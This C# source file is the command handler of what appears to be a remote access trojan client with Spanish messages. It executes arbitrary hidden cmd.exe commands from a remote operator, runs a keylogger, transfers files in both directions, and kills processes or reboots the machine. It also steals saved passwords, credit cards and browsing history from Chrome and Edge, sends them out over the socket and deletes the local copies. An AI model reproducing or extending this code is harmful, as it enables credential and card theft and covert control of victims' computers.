using System.Diagnostics;
using System.Text;
using Client.Conexion;
using Client.Stealers;
using Client.Util;
using static System.Runtime.InteropServices.JavaScript.JSType;


namespace Client.Commands
{
    static class HandleCommands
    {

        public static string ExecuteCommand(string command) {

            if (string.IsNullOrWhiteSpace(command))
                return "[ERROR] El comando está vacío.";

            try
            {
                var processInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using (var process = new Process { StartInfo = processInfo })
                {
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    if (!string.IsNullOrWhiteSpace(error))
                        output += $"\n[Error]\n{error}";

                    return output;
                }
            }
            catch (Exception ex)
            {
                return $"[EXCEPCIÓN] {ex.Message}";
            }
        }

        public static async Task ProcessCommandAsync(string command)
        {
            var stream = ClientSocket.getClientStream();

            if (string.IsNullOrWhiteSpace(command))
            {
                // Envía un mensaje vacío o de error
                var empty = Encoding.UTF8.GetBytes("[ERROR] Comando vacío\n");
                Protocol.Send(stream, Channel.CommandOutput, empty);
                return;
            }

            if (command.StartsWith("exec"))
            {
                string result = ExecuteCommand(command.Substring(5));
                ClientSocket.SendResponse(result, Channel.CommandOutput);
                return;
            }
            else if (command == "keylogger")
            {
                Keylogger.Start();
            }
            else if (command == "keylogger stop")
            {
                Keylogger.Stop();
            }
            else if (command == "list_processes")
            {
               string response = Functions.ListProcesses();
            }
            else if (command.StartsWith("get "))
            {
                string fileName = command.Substring(4).Trim();
                ClientSocket.SendFile(fileName);
                return;
            }
            else if (command == "browsers")
            {
                string  response = Functions.ListInstalledBrowsers();
            }
            else if (command == "reboot")
            {
                string response = HandleCommands.ExecuteCommand("shutdown /r /t 1");
            }
            else if (command == "shutdown")
            {
                string response = HandleCommands.ExecuteCommand("shutdown /s");
            }
            else if (command == "antivirus")
            {
                string response = Functions.ListInstalledAntivirus();
            }
            else if (command == "network_info")
            {
                string response = await SystemInfo.GetNetworkInfo();
            }
            else if (command == "system_info")
            {
                string sysinfo= await SystemInfo.GetSystemInfo();
                var data = Encoding.UTF8.GetBytes(sysinfo);
                Protocol.Send(stream, Channel.SystemInfo, data);
                return;
            }
            else if (command == "screenshot")
            {
                string timestamp = DateTime.Now.ToString("yyyyMMdd-HHmmss");
                string filename = $"infiltrator-{timestamp}-screenshot.png";
                
                //Protocol.Send(stream, Channel.Screenshot, Screenshot.CaptureScreen(filename));
                File.Delete(filename);
                
            }
            else if (command == "disconnect")
            {
                
                ClientSocket.setConnected(false);
                return;
            }
            else if (command.StartsWith("kill "))
            {
                int pid;
                string killPID;
                if (int.TryParse(command.Substring(5), out pid))
                {
                    killPID = Functions.KillProcess(pid);
                }
                else
                {
                    killPID = "Formato de comando 'kill' incorrecto. Uso: kill PID";
                }
            }
            else if (command.StartsWith("sendfile "))
            {
                string fileName = command.Substring(9).Trim();
                ClientSocket.ReceiveFile(fileName);
                string response = $"Archivo {fileName} recibido correctamente.";
            }
            else if (command == "chrome_passwords")
            {
                ChromeStealer.getChromePasswords();
             

                if (File.Exists("chrome_passwords.csv") ) 
                {
                    ClientSocket.SendFile("chrome_passwords.csv");
                    File.Delete("chrome_passwords.csv");
                    string response = "";
                }
                else
                {
                    string response = "Error al intentar obtener las credenciales de Chrome";
                }

                
            }
            else if (command == "chrome_ccs")
            {
               
                ChromeStealer.getChromeCCs();

                if (File.Exists("chrome_ccs.csv"))
                {
                    ClientSocket.SendFile("chrome_ccs.csv");
                    File.Delete("chrome_ccs.csv");
                    string response = "";
                }
                else
                {
                    string response = "Error al intentar obtener las tarjetas de crédito de Chrome";
                }
            }
            else if (command == "chrome_history")
            {

                ChromeStealer.getChromeHistory();

                if (File.Exists("chrome_history.csv"))
                {
                    ClientSocket.SendFile("chrome_history.csv");
                    File.Delete("chrome_history.csv");
                    return;
                }
                else
                {
                    string response = "Error al intentar obtener el historial de Chrome";
                }
            }
            else if (command == "edge_passwords")
            {
                EdgeStealer.getEdgePasswords();


                if (File.Exists("edge_passwords.csv"))
                {
                    ClientSocket.SendFile("edge_passwords.csv");
                    File.Delete("edge_passwords.csv");

                    return;
                }
                else
                {
                   string response = "Error al intentar obtener las credenciales de Edge";
                }


            }
            else if (command == "edge_ccs")
            {

                EdgeStealer.getEdgeCcs();

                if (File.Exists("edge_ccs.csv"))
                {
                    ClientSocket.SendFile("edge_ccs.csv");
                    File.Delete("edge_ccs.csv");
                    return;
                }
                else
                {
                    string response = "Error al intentar obtener las tarjetas de crédito de Edge";
                }
            }
            else if (command == "edge_history")
            {

                EdgeStealer.getEdgeHistory();

                if (File.Exists("edge_history.csv"))
                {
                    ClientSocket.SendFile("edge_history.csv");
                    File.Delete("edge_history.csv");
                    return;
                }
                else
                {
                   string response = "Error al intentar obtener el historial de Edge";
                }
            }
            else
            {
               string response = "Comando no reconocido.";
            }

            
        }


    }
}

